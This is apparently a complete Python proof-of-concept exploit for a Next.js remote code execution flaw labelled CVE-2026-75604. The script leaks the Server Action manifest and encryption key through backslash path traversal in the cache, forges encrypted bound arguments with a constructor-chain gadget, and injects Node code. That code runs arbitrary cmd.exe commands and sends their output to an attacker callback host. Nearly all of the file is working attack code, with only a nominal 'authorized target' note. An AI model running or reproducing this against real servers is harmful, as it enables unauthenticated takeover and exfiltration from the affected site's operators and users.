#!/usr/bin/env python3

import argparse
import base64
import html
import http.server
import ipaddress
import json
import os
import re
import secrets
import ssl
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser

import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


class NotVulnerableError(RuntimeError):
    pass


class InconclusiveError(RuntimeError):
    pass


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class ActionFormParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms = []
        self.current_form = None

    def handle_starttag(self, tag, attrs):
        if tag == "form":
            self.current_form = []
        elif self.current_form is not None and tag in {
            "input",
            "textarea",
            "select",
            "button",
        }:
            attributes = dict(attrs)
            if attributes.get("name"):
                self.current_form.append(
                    (attributes["name"], attributes.get("value", ""))
                )

    def handle_endtag(self, tag):
        if tag == "form" and self.current_form is not None:
            self.forms.append(self.current_form)
            self.current_form = None


class HttpClient:
    def __init__(self, target, timeout, insecure):
        parsed = urllib.parse.urlsplit(target)
        if parsed.scheme not in {"http", "https"} or not parsed.netloc:
            raise ValueError("target must be an HTTP or HTTPS URL")
        if parsed.path not in {"", "/"} or parsed.query or parsed.fragment:
            raise ValueError("target must not contain a path, query, or fragment")

        self.origin = f"{parsed.scheme}://{parsed.netloc}"
        self.timeout = timeout
        self.verify_tls = not insecure
        context = ssl._create_unverified_context() if insecure else ssl.create_default_context()
        self.opener = urllib.request.build_opener(
            NoRedirect(), urllib.request.HTTPSHandler(context=context)
        )

    def request(self, path, method="GET", data=None, headers=None):
        request = urllib.request.Request(
            self.origin + path,
            data=data,
            headers=headers or {},
            method=method,
        )
        try:
            with self.opener.open(request, timeout=self.timeout) as response:
                return response.status, response.read()
        except urllib.error.HTTPError as error:
            return error.code, error.read()
        except (urllib.error.URLError, TimeoutError, OSError) as error:
            raise InconclusiveError(f"request to {path} failed: {error}") from error

    def get_text(self, path):
        status, body = self.request(path)
        if status < 200 or status >= 300:
            raise NotVulnerableError(f"GET {path} returned HTTP {status}")
        return body.decode("utf-8", errors="replace")


def parse_build_id(pages_html):
    match = re.search(
        r'<script id="__NEXT_DATA__" type="application/json">(.*?)</script>',
        pages_html,
        re.DOTALL,
    )
    if not match:
        raise NotVulnerableError("the Pages Router response has no build ID")
    return json.loads(html.unescape(match.group(1)))["buildId"]


def normalize_route_path(path, option_name, allow_root=True):
    if not path.startswith("/") or path.startswith("//"):
        raise ValueError(f"{option_name} must be an absolute URL path")
    if "?" in path or "#" in path or "\\" in path:
        raise ValueError(f"{option_name} must not contain a query, fragment, or backslash")
    normalized = path.rstrip("/") or "/"
    if not allow_root and normalized == "/":
        raise ValueError(f"{option_name} must identify a concrete route instance")
    return normalized


def traversal_request_path(route_path, filename, prefix="", suffix=""):
    parent = route_path.rsplit("/", 1)[0] or "/"
    depth = len([segment for segment in parent.split("/") if segment]) + 1
    traversal = "..%5C" * depth + filename
    parent_path = "" if parent == "/" else parent
    return f"{prefix}{parent_path}/{traversal}{suffix}"


def leak_manifest(client, build_id, app_cache_path, pages_cache_path):
    app_traversal = traversal_request_path(
        app_cache_path, "server-reference-manifest"
    )
    client.get_text(app_traversal)
    pages_traversal = traversal_request_path(
        pages_cache_path,
        "server-reference-manifest",
        prefix=f"/_next/data/{build_id}",
        suffix=".json",
    )
    body = client.get_text(pages_traversal)
    try:
        manifest = json.loads(body)
    except json.JSONDecodeError as error:
        raise NotVulnerableError("the cache traversal did not return a manifest") from error
    if not manifest.get("encryptionKey") or not manifest.get("node"):
        raise NotVulnerableError("the disclosed file has no Server Action key")
    return manifest


def parse_actions(client, action_path, requested_field):
    action_html = client.get_text(action_path)
    parser = ActionFormParser()
    parser.feed(action_html)
    actions = []
    for form in parser.forms:
        fields = dict(form)
        references = [
            name.removeprefix("$ACTION_REF_")
            for name, _ in form
            if name.startswith("$ACTION_REF_")
        ]
        public_fields = list(
            dict.fromkeys(
                name for name, _ in form if not name.startswith("$ACTION_")
            )
        )
        detected_field = public_fields[0] if len(public_fields) == 1 else None
        for reference in references:
            descriptor = fields.get(f"$ACTION_{reference}:0")
            if not descriptor:
                continue
            try:
                action = json.loads(descriptor)
                actions.append(
                    (reference, action["id"], requested_field or detected_field)
                )
            except (json.JSONDecodeError, KeyError, TypeError):
                continue
    if not actions:
        raise NotVulnerableError("no compatible closure-bound Server Action was found")
    return actions


def encrypt_bound_args(action_id, encryption_key):
    flight = b'1:{}\n0:["$1:constructor:constructor"]\n'
    iv = os.urandom(16)
    plaintext = action_id.encode() + flight
    ciphertext = AESGCM(encryption_key).encrypt(iv, plaintext, None)
    return base64.b64encode(iv + ciphertext).decode()


def build_command_body(command, callback_ip, callback_port, callback_path):
    return (
        'const cp=process.mainModule.require("node:child_process");'
        'const http=process.mainModule.require("node:http");'
        'const output=cp.execFileSync("cmd.exe",["/d","/s","/c",'
        + json.dumps(command)
        + '],{encoding:"utf8"});'
        'const body=String(output);'
        'const request=http.request({host:'
        + json.dumps(callback_ip)
        + ",port:"
        + str(callback_port)
        + ",path:"
        + json.dumps(callback_path)
        + ',method:"POST",headers:{"Content-Type":"text/plain",'
        '"Content-Length":Buffer.byteLength(body)}},()=>{});'
        'request.on("error",()=>{});request.end(body);return body'
    )


def start_callback(listen_address, port, expected_path):
    result = {"body": None}
    received = threading.Event()

    class CallbackHandler(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            if self.path != expected_path:
                self.send_error(404)
                return
            try:
                length = int(self.headers.get("Content-Length", "0"))
            except ValueError:
                self.send_error(400)
                return
            if length < 0 or length > 1024 * 1024:
                self.send_error(413)
                return
            result["body"] = self.rfile.read(length)
            self.send_response(204)
            self.end_headers()
            received.set()

        def log_message(self, format, *args):
            pass

    try:
        server = http.server.ThreadingHTTPServer((listen_address, port), CallbackHandler)
    except OSError as error:
        raise InconclusiveError(f"could not listen on {listen_address}:{port}: {error}") from error
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, received, result


def send_action(
    client,
    action_path,
    action_field,
    reference,
    action_id,
    encrypted_args,
    command_body,
):
    fields = [
        (f"$ACTION_REF_{reference}", ""),
        (
            f"$ACTION_{reference}:0",
            json.dumps({"id": action_id, "bound": "$@1"}, separators=(",", ":")),
        ),
        (f"$ACTION_{reference}:1", '["$@2"]'),
        (f"$ACTION_{reference}:2", json.dumps(encrypted_args)),
        (action_field, command_body),
    ]
    try:
        response = requests.post(
            client.origin + action_path,
            files=[(name, (None, str(value))) for name, value in fields],
            headers={"Origin": client.origin},
            timeout=client.timeout,
            verify=client.verify_tls,
            allow_redirects=False,
        )
    except requests.RequestException as error:
        raise InconclusiveError(f"Server Action request failed: {error}") from error
    return response.status_code


def run_exploit(args):
    callback_ip = str(ipaddress.IPv4Address(args.callback_ip))
    client = HttpClient(args.target, args.timeout, args.insecure)
    pages_cache_path = normalize_route_path(
        args.pages_cache_path, "--pages-cache-path", allow_root=False
    )
    app_cache_path = normalize_route_path(
        args.app_cache_path, "--app-cache-path", allow_root=False
    )
    action_path = normalize_route_path(args.action_path, "--action-path")
    if args.action_field and args.action_field.startswith("$ACTION_"):
        raise ValueError("--action-field must be an application form field")

    print("CVE-2026-75604 RCE PoC")
    print("========================")
    print(f"Target      : {client.origin}")
    print(f"Pages route : {pages_cache_path}")
    print(f"App route   : {app_cache_path}")
    print(f"Action page : {action_path}")
    print(f"Callback    : {callback_ip}:{args.callback_port}")
    print(f"Command     : {args.command}")

    print("\n[*] Reading the Next.js filesystem cache")
    build_id = parse_build_id(client.get_text(pages_cache_path))
    manifest = leak_manifest(
        client, build_id, app_cache_path, pages_cache_path
    )
    print("[+] Private Server Action manifest disclosed")

    actions = parse_actions(client, action_path, args.action_field)
    selected_action = next(
        (
            (reference, action_id, action_field)
            for reference, action_id, action_field in actions
            if action_id in manifest["node"] and action_field
        ),
        None,
    )
    if not selected_action:
        manifest_actions = [
            action for action in actions if action[1] in manifest["node"]
        ]
        if manifest_actions:
            raise NotVulnerableError(
                "the action form has multiple fields; specify --action-field"
            )
        raise NotVulnerableError("the selected action is absent from the manifest")
    reference, action_id, action_field = selected_action
    print("[+] Compatible closure-bound Server Action found")

    try:
        encryption_key = base64.b64decode(manifest["encryptionKey"], validate=True)
        encrypted_args = encrypt_bound_args(action_id, encryption_key)
    except (ValueError, TypeError) as error:
        raise NotVulnerableError("the disclosed encryption key is invalid") from error

    callback_path = f"/result/{secrets.token_urlsafe(18)}"
    server, received, result = start_callback(
        args.listen_address, args.callback_port, callback_path
    )
    try:
        print("[*] Sending the forged Server Action request")
        command_body = build_command_body(
            args.command, callback_ip, args.callback_port, callback_path
        )
        send_action(
            client,
            action_path,
            action_field,
            reference,
            action_id,
            encrypted_args,
            command_body,
        )
        if not received.wait(args.timeout):
            raise InconclusiveError("the command callback was not received")
    finally:
        server.shutdown()
        server.server_close()

    output = result["body"].decode("utf-8", errors="replace").rstrip()
    print("\n--- command output ---")
    print(output or "<no output>")
    print("----------------------")
    print("\n[+] VULNERABLE: unauthenticated command execution confirmed")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Reproduce CVE-2026-75604 against an authorized target."
    )
    parser.add_argument("--target", required=True, help="Next.js base URL")
    parser.add_argument(
        "--callback-ip",
        required=True,
        help="IPv4 address reachable by the target",
    )
    parser.add_argument(
        "--pages-cache-path",
        required=True,
        metavar="PATH",
        help="existing dynamic Pages Router ISR page used as a traversal anchor",
    )
    parser.add_argument(
        "--app-cache-path",
        required=True,
        metavar="PATH",
        help="existing dynamic App Router page used as a cache traversal anchor",
    )
    parser.add_argument(
        "--action-path",
        default="/",
        metavar="PATH",
        help="App Router page containing a compatible Server Action (default: /)",
    )
    parser.add_argument(
        "--action-field",
        metavar="NAME",
        help="form field consumed by the action (detected when unambiguous)",
    )
    parser.add_argument("--callback-port", type=int, default=4331)
    parser.add_argument("--listen-address", default="0.0.0.0")
    parser.add_argument("--command", default="whoami")
    parser.add_argument("--timeout", type=int, default=20)
    parser.add_argument(
        "--insecure",
        action="store_true",
        help="disable TLS certificate verification",
    )
    return parser.parse_args()


def main():
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(line_buffering=True)
    args = parse_args()
    try:
        run_exploit(args)
    except NotVulnerableError as error:
        print(f"\n[-] NOT VULNERABLE: {error}", file=sys.stderr)
        raise SystemExit(1)
    except InconclusiveError as error:
        print(f"\n[!] INCONCLUSIVE: {error}", file=sys.stderr)
        raise SystemExit(2)
    except (KeyError, RuntimeError, ValueError) as error:
        print(f"\n[-] EXPLOIT FAILED: {error}", file=sys.stderr)
        raise SystemExit(3)


if __name__ == "__main__":
    main()
